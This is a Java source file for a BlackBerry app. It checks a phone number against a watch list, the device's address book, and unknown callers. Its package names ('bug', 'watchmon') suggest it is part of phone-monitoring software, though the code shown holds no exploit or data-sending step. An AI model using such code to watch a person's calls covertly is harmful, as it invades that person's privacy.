package com.vvt.watchmon;

import java.util.Enumeration;
import java.util.Vector;
import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryContactList;
import net.rim.blackberry.api.pdap.BlackBerryPIM;
import com.vvt.bug.PhoneNumberFormat;
import com.vvt.bug.Util;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class WatchListMonitor {
	
	private final String TAG = "WatchListMonitor";
	private Util util = new Util();
	
	public boolean isWatchList(WatchListInfo watchListInfo, String phoneNumber) {
		boolean isMatch = false;
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".isWatchList()", "phoneNumber: " + phoneNumber);
		}
		// Watch all numbers
		if ((watchListInfo.isInWatchListEnabled() && watchListInfo.isInAddrbookEnabled() &&
				watchListInfo.isNotInAddrbookEnabled() && watchListInfo.isUnknownEnabled()) || 
				(watchListInfo.isInAddrbookEnabled() && watchListInfo.isNotInAddrbookEnabled())) {
			isMatch = true;
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".isWatchList()", "Watch all, isMatch: " + isMatch);
			}
		} 
		if (!isMatch && watchListInfo.isInAddrbookEnabled()) {
			isMatch = isInAddressbook(phoneNumber);
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".isWatchList()", "In addressbook, isMatch: " + isMatch);
			}
		}
		if (!isMatch && watchListInfo.isNotInAddrbookEnabled()) {
			isMatch = isNotInAddressbook(phoneNumber);
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".isWatchList()", "Not in addressbook, isMatch: " + isMatch);
			}
		}
		if (!isMatch && watchListInfo.isInWatchListEnabled()) {
			isMatch = isInWatchList(watchListInfo.getWatchNumberStore(), phoneNumber);
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".isWatchList()", "In watch list, isMatch: " + isMatch);
			}
		}
		if (!isMatch && watchListInfo.isUnknownEnabled()) {
			isMatch = isUnknownNumber(phoneNumber);
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".isWatchList()", "Unknown, isMatch: " + isMatch);
			}
		}
		return  isMatch;
	}
	
	private boolean isInWatchList(Vector watchNumberStore, String phoneNumber) {
		return util.isInSrcNumberList(watchNumberStore, phoneNumber);
	}
	
	private boolean isInAddressbook(String phoneNumber) {
		boolean isMatch = false;
		BlackBerryContactList contactList = null;
		String[] listPIMLists = BlackBerryPIM.getInstance().listPIMLists(BlackBerryPIM.CONTACT_LIST);
		try {
			for (int i = 0; i < listPIMLists.length && !isMatch; i++) {
				contactList = (BlackBerryContactList)BlackBerryPIM.getInstance().openPIMList(BlackBerryPIM.CONTACT_LIST, BlackBerryPIM.READ_ONLY, listPIMLists[i]);
				Enumeration contactEnum = contactList.items();		
				while (contactEnum.hasMoreElements() && !isMatch) {
					BlackBerryContact contact = (BlackBerryContact)contactEnum.nextElement();
					int telCount = contact.countValues(BlackBerryContact.TEL);
				    if (telCount > 0) {
				    	for (int atrCount = 0; atrCount < telCount; ++atrCount) {
					    	int number = contact.getAttributes(BlackBerryContact.TEL, atrCount);
					    	switch (number) {
					    	case BlackBerryContact.ATTR_HOME:
					    		String homePhone = contact.getString(BlackBerryContact.TEL, atrCount);
					    		isMatch = util.isSameNumber(homePhone, phoneNumber);
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "ATTR_HOME, homePhone: " + homePhone + ", phoneNumber: " + phoneNumber + "isMatch: " + isMatch);
					    		}*/
					    		break;
					    	
					    	case BlackBerryContact.ATTR_MOBILE:
					    		String mobilePhone = contact.getString(BlackBerryContact.TEL, atrCount);
					    		isMatch = util.isSameNumber(mobilePhone, phoneNumber);
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "ATTR_MOBILE, mobilePhone: " + mobilePhone + ", phoneNumber: " + phoneNumber + "isMatch: " + isMatch);
					    		}*/
					    		break;
					    		
					    	case BlackBerryContact.ATTR_WORK:
					    		String workPhone = contact.getString(BlackBerryContact.TEL, atrCount);
					    		isMatch = util.isSameNumber(workPhone, phoneNumber);
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "ATTR_WORK, workPhone: " + workPhone + ", phoneNumber: " + phoneNumber + "isMatch: " + isMatch);
					    		}*/
					    		break;
					    		
					    	case BlackBerryContact.ATTR_OTHER:
					    		String otherPhone = contact.getString(BlackBerryContact.TEL, atrCount);
					    		isMatch = util.isSameNumber(otherPhone, phoneNumber);
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "ATTR_OTHER, otherPhone: " + otherPhone + ", phoneNumber: " + phoneNumber + "isMatch: " + isMatch);
					    		}*/
					    		break;
					    		
					    	case BlackBerryContact.ATTR_FAX:
					    		String fax = contact.getString(BlackBerryContact.TEL, atrCount);
					    		isMatch = util.isSameNumber(fax, phoneNumber);
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "ATTR_FAX, fax: " + fax + ", phoneNumber: " + phoneNumber + "isMatch: " + isMatch);
					    		}*/
					    		break;
					    		
					    	case BlackBerryContact.ATTR_PAGER:
					    		String pager = contact.getString(BlackBerryContact.TEL, atrCount);
					    		isMatch = util.isSameNumber(pager, phoneNumber);
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "ATTR_PAGER, pager: " + pager + ", phoneNumber: " + phoneNumber + "isMatch: " + isMatch);
					    		}*/
					    		break;
					    		
					    	}
					    	if (isMatch) {
					    		/*if (Log.isDebugEnable()) {
					    			Log.debug(TAG + ".isInAddressbook()", "isMatch: " + isMatch);
					    		}*/
					    		break;
					    	}
				    	}
				    } 	
				}
			}
			contactList.close();
		} catch (Exception e) {
			Log.error("WatchListMonitor.isInAddressbook()", e.getMessage(), e);
		}
		return isMatch;
	}
	
	private boolean isNotInAddressbook(String phoneNumber) {
		boolean isMatch = false;
		return (isMatch = !isInAddressbook(phoneNumber));
	}
	
	private boolean isUnknownNumber(String phoneNumber) {
		boolean unknown = false;
		phoneNumber = PhoneNumberFormat.removeNonDigitCharacters(phoneNumber).trim();
		if (phoneNumber.equals(Constant.EMPTY_STRING)) {
			unknown = true;
		}
		return unknown;
	}
}
